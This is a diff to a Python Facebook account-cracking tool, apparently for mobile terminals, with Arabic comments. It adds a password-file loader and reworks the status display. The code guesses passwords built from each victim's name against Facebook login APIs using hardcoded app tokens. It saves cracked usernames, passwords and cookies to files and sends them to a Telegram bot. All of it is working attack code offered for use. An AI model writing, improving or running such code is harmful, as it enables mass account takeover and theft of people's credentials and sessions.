@@ -78,20 +78,49 @@ class __PSJO__:
         self.__CP__ = []
         self.plist = []
 
-    # ... (تابع باقي الكود في الجزء التالي)
-    def __M1X__(self, ids, names, passlist):
+    def __LOAD_PASS_FILE__(self):
+        """تحميل الباسوردات من ملف خارجي"""
+        __CLEAR__()
+        print(f"{xp} EXAMPLE PATH {xpxx} /sdcard/pass.txt")
+        __LINE__()
+        __pass_path__ = input(f"{xpx} INPUT PASSWORD FILE PATH {xpxx} ")
         try:
-            color = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m", "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m", "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
-            sys.stdout.write(f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M1{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]>{W}-{R}<[{G}{self.successful_attempts}{R}/{W}ATT{R}]> ')
-            sys.stdout.flush()
+            if not __pass_path__.startswith("/") and not __pass_path__.startswith("./"):
+                __pass_full__ = f"/sdcard/{__pass_path__}"
+            else:
+                __pass_full__ = __pass_path__
+            with open(__pass_full__, 'r', encoding='utf-8', errors='ignore') as f:
+                passwords = [line.strip() for line in f if line.strip()]
+            if not passwords:
+                print(f"{xp} FILE IS EMPTY! USING DEFAULT PASSWORDS.")
+                time.sleep(1.5)
+                return ["first12345", "first123456", "firstlast", "first@123", "first786", "first112233"]
+            print(f"{xp} LOADED {G}{len(passwords)}{W} PASSWORDS FROM FILE")
+            time.sleep(1)
+            return passwords
+        except FileNotFoundError:
+            print(f"{xp} FILE NOT FOUND! USING DEFAULT PASSWORDS.")
+            time.sleep(1.5)
+            return ["first12345", "first123456", "firstlast", "first@123", "first786", "first112233"]
+        except Exception as e:
+            print(f"{xp} ERROR: {str(e)[:40]}... USING DEFAULT PASSWORDS.")
+            time.sleep(1.5)
+            return ["first12345", "first123456", "firstlast", "first@123", "first786", "first112233"]
 
-            fn = names.split(' ')[0]
-            try: ln = names.split(' ')[1]
-            except: ln = fn
+    def __M1X__(self, ids, names, passlist):
+        fn = names.split(' ')[0]
+        try: ln = names.split(' ')[1]
+        except: ln = fn
 
-            for pw in passlist:
+        for pw in passlist:
+            try:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('FIRST', fn.upper()) \
        .replace('last', ln.lower()).replace('Last', ln).replace('LAST', ln.upper())
+                
+                # عرض الباسورد الحالي مباشرة
+                sys.stdout.write(f'\r{xp}{W} [M1] {B}{ids}{W} | Trying: {Y}{pas[:30]:<30}{W} | OK:{G}{len(self.oks)}{W} | ATK:{G}{self.successful_attempts}{W}')
+                sys.stdout.flush()
+                
                 ua = UA()
                 accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32', '256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                 random_seed = random.Random()
@@ -126,47 +155,48 @@ class __PSJO__:
                         ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                         cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                         ok_message = f"OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
-                        print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
+                        print(f'\r{xp}{G} [OK] {ids} | {pas} {W}')
                         send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ok_message)
                         if 'y' in self.__COOKIE__:
-                            print(f'\r{xp}{W}-{R}<{W}[{R}COOKIE{W}]{R}> {cookie}')
-                        open('/sdcard/PS-/FILE/𝗙𝗔𝐈𝐑𝐎𝐒-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                            print(f'{xp}{W} COOKIE: {cookie}')
+                        open('/sdcard/PS-/FILE/PS-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                         self.oks.append(ids)
                         break
                     elif twf in str(po):
                         if 'y' in self.__CP__:
-                            print(f'\r{xp}{W}-{R}<{W}[{R}PS-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')
-                        open('/sdcard/PS-/FILE/𝗙𝗔𝐈𝐑𝐎𝐒-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                            print(f'\r{xp}{R} [2F] {ids} | {pas} {W}')
+                        open('/sdcard/PS-/FILE/PS-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                         self.twf.append(ids)
                         break
                     elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                         if 'y' in self.__CP__:
                             cp_message = f"CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
-                            print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
+                            print(f'\r{xp}{R} [CP] {ids} | {pas} {W}')
                             send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, cp_message)
-                        open('/sdcard/PS-/FILE/𝗙𝗔𝐈𝐑𝐎𝐒-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        open('/sdcard/PS-/FILE/PS-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                         self.cps.append(ids)
                         break
                 except:
                     continue
-            self.loop += 1
-        except:
-            pass
+            except Exception as e:
+                continue
+        self.loop += 1
     
     
     def __M2X__(self, ids, names, passlist):
-        try:
-            color = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m", "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m", "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
-            sys.stdout.write(f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M2{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]>{W}-{R}<[{G}{self.successful_attempts}{R}/{W}ATT{R}]> ')
-            sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try: ln = names.split(' ')[1]
+        except: ln = fn
 
-            fn = names.split(' ')[0]
-            try: ln = names.split(' ')[1]
-            except: ln = fn
-
-            for pw in passlist:
+        for pw in passlist:
+            try:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('FIRST', fn.upper()) \
        .replace('last', ln.lower()).replace('Last', ln).replace('LAST', ln.upper())
+                
+                # عرض الباسورد الحالي مباشرة
+                sys.stdout.write(f'\r{xp}{W} [M2] {B}{ids}{W} | Trying: {Y}{pas[:30]:<30}{W} | OK:{G}{len(self.oks)}{W} | ATK:{G}{self.successful_attempts}{W}')
+                sys.stdout.flush()
+                
                 ua = UA()
                 accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32', '256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                 random_seed = random.Random()
@@ -201,43 +231,47 @@ class __PSJO__:
                         ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                         cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                         ok_message = f"OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
-                        print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
+                        print(f'\r{xp}{G} [OK] {ids} | {pas} {W}')
                         send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ok_message)
                         if 'y' in self.__COOKIE__:
-                            print(f'\r{xp}{W}-{R}<{W}[{R}COOKIE{W}]{R}> {cookie}')
+                            print(f'{xp}{W} COOKIE: {cookie}')
                         open('/sdcard/PS-/FILE/PS-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                         self.oks.append(ids)
                         break
                     elif twf in str(po):
                         if 'y' in self.__CP__:
-                            print(f'\r{xp}{W}-{R}<{W}[{R}PS-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')
+                            print(f'\r{xp}{R} [2F] {ids} | {pas} {W}')
                         open('/sdcard/PS-/FILE/PS-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                         self.twf.append(ids)
                         break
                     elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                         if 'y' in self.__CP__:
                             cp_message = f"CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
-                            print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
+                            print(f'\r{xp}{R} [CP] {ids} | {pas} {W}')
                             send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, cp_message)
                         open('/sdcard/PS-/FILE/PS-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                         self.cps.append(ids)
                         break
                 except:
                     continue
-            self.loop += 1
-        except:
-            pass
+            except:
+                continue
+        self.loop += 1
             
     def __M3X__(self, ids, names, passlist):
-        try:
-            color = random.choice(["\x1b[38;5;46m", "\x1b[38;5;226m", "\033[1;37m"])
-            fn = names.split(' ')[0]
-            try: ln = names.split(' ')[1]
-            except: ln = fn
+        fn = names.split(' ')[0]
+        try: ln = names.split(' ')[1]
+        except: ln = fn
 
-            for pw in passlist:
+        for pw in passlist:
+            try:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('FIRST', fn.upper()) \
        .replace('last', ln.lower()).replace('Last', ln).replace('LAST', ln.upper())
+                
+                # عرض الباسورد الحالي مباشرة
+                sys.stdout.write(f'\r{xp}{W} [M3] {B}{ids}{W} | Trying: {Y}{pas[:30]:<30}{W} | OK:{G}{len(self.oks)}{W} | ATK:{G}{self.successful_attempts}{W}')
+                sys.stdout.flush()
+                
                 ua = UA()
                 accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                 random_seed = random.Random()
@@ -265,10 +299,6 @@ class __PSJO__:
                 url = "https://api.facebook.com/auth/login"
                 twf = "Login approval's are on"
 
-                # عرض الباسورد الجاري + Progress
-                sys.stdout.write(f'\r{xp}{W} M3-{self.loop} | OK:{G}{len(self.oks)}{W} | Trying: {Y}{pas[:28]:<28}{W}')
-                sys.stdout.flush()
-
                 try:
                     po = requests.post(url, data=data, headers=headers, timeout=10).json()
                     self.successful_attempts += 1
@@ -281,7 +311,7 @@ class __PSJO__:
                         print(f'\r{xp}{G} [OK] {ids} | {pas} {W}')
                         send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ok_message)
                         if 'y' in self.__COOKIE__:
-                            print(f'\r{xp}{W} COOKIE: {cookie}')
+                            print(f'{xp}{W} COOKIE: {cookie}')
                         open('/sdcard/PS-/FILE/PS-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                         self.oks.append(ids)
                         break
@@ -300,25 +330,27 @@ class __PSJO__:
                         self.cps.append(ids)
                         break
                 except requests.exceptions.RequestException as e:
-                    print(f'\r{R}❌ Connection Error [M3]: {str(e)[:50]} - Retrying...{W}')
                     continue
                 except:
                     continue
-            self.loop += 1
-        except:
-            pass
-
+            except:
+                continue
+        self.loop += 1
 
     def __M4X__(self, ids, names, passlist):
-        try:
-            color = random.choice(["\x1b[38;5;46m", "\x1b[38;5;226m", "\033[1;37m"])
-            fn = names.split(' ')[0]
-            try: ln = names.split(' ')[1]
-            except: ln = fn
+        fn = names.split(' ')[0]
+        try: ln = names.split(' ')[1]
+        except: ln = fn
 
-            for pw in passlist:
+        for pw in passlist:
+            try:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('FIRST', fn.upper()) \
        .replace('last', ln.lower()).replace('Last', ln).replace('LAST', ln.upper())
+                
+                # عرض الباسورد الحالي مباشرة
+                sys.stdout.write(f'\r{xp}{W} [M4] {B}{ids}{W} | Trying: {Y}{pas[:30]:<30}{W} | OK:{G}{len(self.oks)}{W} | ATK:{G}{self.successful_attempts}{W}')
+                sys.stdout.flush()
+                
                 ua = UA()
                 accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                 random_seed = random.Random()
@@ -346,10 +378,6 @@ class __PSJO__:
                 url = "https://b-api.facebook.com/auth/login"
                 twf = "Login approval's are on"
 
-                # عرض الباسورد الجاري + Progress
-                sys.stdout.write(f'\r{xp}{W} M4-{self.loop} | OK:{G}{len(self.oks)}{W} | Trying: {Y}{pas[:28]:<28}{W}')
-                sys.stdout.flush()
-
                 try:
                     po = requests.post(url, data=data, headers=headers, timeout=10).json()
                     self.successful_attempts += 1
@@ -362,7 +390,7 @@ class __PSJO__:
                         print(f'\r{xp}{G} [OK] {ids} | {pas} {W}')
                         send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ok_message)
                         if 'y' in self.__COOKIE__:
-                            print(f'\r{xp}{W} COOKIE: {cookie}')
+                            print(f'{xp}{W} COOKIE: {cookie}')
                         open('/sdcard/PS-/FILE/PS-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                         self.oks.append(ids)
                         break
@@ -381,13 +409,13 @@ class __PSJO__:
                         self.cps.append(ids)
                         break
                 except requests.exceptions.RequestException as e:
-                    print(f'\r{R}❌ Connection Error [M4]: {str(e)[:50]} - Retrying...{W}')
                     continue
                 except:
                     continue
-            self.loop += 1
-        except:
-            pass
+            except:
+                continue
+        self.loop += 1
+
     def __MENU__(self) -> None:
         if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
             self.get_telegram_credentials()
@@ -465,12 +493,15 @@ class __PSJO__:
         __CLEAR__()
         print(f"{xp1} AUTO PASSLIST ")
         print(f"{xp2} CUSTOM PASSLIST ")
+        print(f"{xp3} FROM FILE ")
         __LINE__()
         __PASLISTF__ = input(f"{xpx} INPUT PASSLIST {xpxx} ") or "1"
 
         self.plist = []
         if __PASLISTF__ == "1":
             self.plist = ["first12345", "first123456", "firstlast", "first@123", "first786", "first112233"]
+        elif __PASLISTF__ == "3":
+            self.plist = self.__LOAD_PASS_FILE__()
         else:
             try:
                 __PASSFM__ = int(input(f"{xp} PASSLIST LIMIT (5-12) {xpxx} ") or 8)
